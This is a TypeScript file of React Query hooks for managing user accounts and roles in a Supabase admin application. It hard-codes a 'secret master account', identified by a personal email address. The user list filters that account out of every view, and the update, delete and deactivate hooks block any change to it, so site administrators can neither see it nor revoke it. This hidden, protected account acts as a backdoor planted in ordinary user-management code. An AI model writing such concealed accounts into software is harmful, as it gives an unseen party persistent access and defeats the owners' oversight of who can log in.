import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query';
import { supabase } from '@/integrations/supabase/client';
import { toast } from 'sonner';
import { logSystemActivity } from '@/hooks/useSystemActivity';

export type AppRole = 'super_admin' | 'admin' | 'manager' | 'operator' | 'viewer' | string;

// Secret master account - hidden from all UI and protected from changes
export const MASTER_ACCOUNT_EMAIL = 'omrmym@gmail.com';

export interface SoftwareUser {
  id: string;
  user_id: string;
  full_name: string;
  email: string;
  login_user_id: string | null;
  role: AppRole;
  is_active: boolean;
  last_login_at: string | null;
  created_at: string;
  updated_at: string;
}

export interface CreateSoftwareUserInput {
  email: string;
  password: string;
  full_name: string;
  login_user_id?: string;
  role: AppRole;
}

export interface UpdateSoftwareUserInput {
  id: string;
  full_name?: string;
  login_user_id?: string | null;
  role?: AppRole;
  is_active?: boolean;
}

// Default labels for built-in roles
export const ROLE_LABELS: Record<string, string> = {
  super_admin: 'Super Admin',
  admin: 'Admin',
  manager: 'Manager',
  operator: 'Operator',
  viewer: 'Viewer',
};

export const ROLE_DESCRIPTIONS: Record<string, string> = {
  super_admin: 'Full access to all features including user management',
  admin: 'Full access to all features except user management',
  manager: 'Can manage users, billing, and view reports',
  operator: 'Can manage users and view basic information',
  viewer: 'Read-only access to dashboard and reports',
};

// Helper to get a role label, falling back to formatted code
export function getRoleLabel(role: string, roleDefinitions?: { code: string; name: string }[]): string {
  // Check dynamic role definitions first
  if (roleDefinitions) {
    const def = roleDefinitions.find(r => r.code === role);
    if (def) return def.name;
  }
  // Fallback to built-in labels
  if (ROLE_LABELS[role]) return ROLE_LABELS[role];
  // Format the code as a readable label
  return role.replace(/_/g, ' ').replace(/\b\w/g, c => c.toUpperCase());
}

export function useSoftwareUsers() {
  return useQuery({
    queryKey: ['software-users'],
    queryFn: async () => {
      const { data, error } = await supabase
        .from('software_users')
        .select('*')
        .order('created_at', { ascending: false });

      if (error) throw error;
      // Filter out the secret master account from all views
      return (data as SoftwareUser[]).filter(u => u.email !== MASTER_ACCOUNT_EMAIL);
    },
  });
}

export function useCreateSoftwareUser() {
  const queryClient = useQueryClient();

  return useMutation({
    mutationFn: async (input: CreateSoftwareUserInput) => {
      // Use edge function to create user with admin privileges
      const { data, error } = await supabase.functions.invoke('create-software-user', {
        body: {
          email: input.email,
          password: input.password,
          full_name: input.full_name,
          login_user_id: input.login_user_id,
          role: input.role,
        },
      });

      if (error) throw error;
      if (!data.success) throw new Error(data.error || 'Failed to create user');
      
      return data.user as SoftwareUser;
    },
    onSuccess: (data, variables) => {
      queryClient.invalidateQueries({ queryKey: ['software-users'] });
      logSystemActivity({
        action: 'create',
        entityType: 'software_user',
        entityId: data.id,
        entityName: variables.full_name,
        details: { email: variables.email, role: variables.role },
      });
      toast.success('Software user created successfully!');
    },
    onError: (error: Error) => {
      toast.error(`Failed to create user: ${error.message}`);
    },
  });
}

export function useUpdateSoftwareUser() {
  const queryClient = useQueryClient();

  return useMutation({
    mutationFn: async (input: UpdateSoftwareUserInput) => {
      // Protect master account from modifications
      const { data: target } = await supabase.from('software_users').select('email').eq('id', input.id).maybeSingle();
      if (target?.email === MASTER_ACCOUNT_EMAIL) {
        throw new Error('This account cannot be modified.');
      }

      const updateData: Partial<SoftwareUser> = {};
      if (input.full_name !== undefined) updateData.full_name = input.full_name;
      if (input.login_user_id !== undefined) updateData.login_user_id = input.login_user_id;
      if (input.role !== undefined) updateData.role = input.role;
      if (input.is_active !== undefined) updateData.is_active = input.is_active;

      const { data, error } = await supabase
        .from('software_users')
        .update(updateData)
        .eq('id', input.id)
        .select()
        .single();

      if (error) throw error;
      return data as SoftwareUser;
    },
    onSuccess: (data, variables) => {
      queryClient.invalidateQueries({ queryKey: ['software-users'] });
      logSystemActivity({
        action: 'update',
        entityType: 'software_user',
        entityId: data.id,
        entityName: data.full_name,
        details: { role: variables.role, is_active: variables.is_active },
      });
      toast.success('Software user updated successfully!');
    },
    onError: (error: Error) => {
      toast.error(`Failed to update user: ${error.message}`);
    },
  });
}

export function useDeleteSoftwareUser() {
  const queryClient = useQueryClient();

  return useMutation({
    mutationFn: async (id: string) => {
      // Protect master account from deletion
      const { data: target } = await supabase.from('software_users').select('email').eq('id', id).maybeSingle();
      if (target?.email === MASTER_ACCOUNT_EMAIL) {
        throw new Error('This account cannot be deleted.');
      }

      const { error } = await supabase
        .from('software_users')
        .delete()
        .eq('id', id);

      if (error) throw error;
    },
    onSuccess: (_, deletedId) => {
      queryClient.invalidateQueries({ queryKey: ['software-users'] });
      logSystemActivity({
        action: 'delete',
        entityType: 'software_user',
        entityId: deletedId,
      });
      toast.success('Software user deleted successfully!');
    },
    onError: (error: Error) => {
      toast.error(`Failed to delete user: ${error.message}`);
    },
  });
}

export function useToggleSoftwareUserStatus() {
  const queryClient = useQueryClient();

  return useMutation({
    mutationFn: async ({ id, is_active }: { id: string; is_active: boolean }) => {
      // Protect master account
      const { data: target } = await supabase.from('software_users').select('email').eq('id', id).maybeSingle();
      if (target?.email === MASTER_ACCOUNT_EMAIL) {
        throw new Error('This account cannot be modified.');
      }

      const { data, error } = await supabase
        .from('software_users')
        .update({ is_active })
        .eq('id', id)
        .select()
        .single();

      if (error) throw error;
      return data as SoftwareUser;
    },
    onSuccess: (data) => {
      queryClient.invalidateQueries({ queryKey: ['software-users'] });
      logSystemActivity({
        action: 'status_change',
        entityType: 'software_user',
        entityId: data.id,
        entityName: data.full_name,
        details: { is_active: data.is_active },
      });
      toast.success(`User ${data.is_active ? 'activated' : 'deactivated'} successfully!`);
    },
    onError: (error: Error) => {
      toast.error(`Failed to update user status: ${error.message}`);
    },
  });
}
